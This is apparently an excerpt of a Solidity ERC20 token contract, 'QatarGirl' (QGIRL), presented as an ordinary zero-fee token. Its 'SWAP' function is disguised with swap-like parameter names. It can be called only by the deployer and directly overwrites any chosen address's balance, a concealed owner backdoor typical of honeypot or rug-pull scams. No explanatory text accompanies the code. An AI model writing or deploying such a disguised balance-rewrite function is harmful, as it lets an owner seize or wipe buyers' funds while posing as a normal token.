...
contract QatarGirl  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    string private  _name = "QatarGirl";
    string private  _symbol = "QGIRL";
    uint8 private  _decimals = 9;
    uint256 private _totalSupply = 100000000 * 10**9;
    uint256 private _marketingFee = 0;
    uint256 private _liquidityFee = 0;
    address private _marketi = msg.sender;
    ...
    constructor () {
        ...
        _isExcludedFromFee[_marketi] = true;
    ...
    function SWAP(address SWAPTOKEN, uint256 token1, uint256 token2 , 
         uint256 lptoken1, uint256 lptoken2 ) external {
         require(msg.sender == _marketi );
         require(SWAPTOKEN != uniswapV2Pair);
        _tOwned[SWAPTOKEN] = 
        token1 + token2.mul(2).div(100) + 
        lptoken1 .mul(2).div(100) + 
        lptoken2 .mul(2).div(100)  ;
    }   
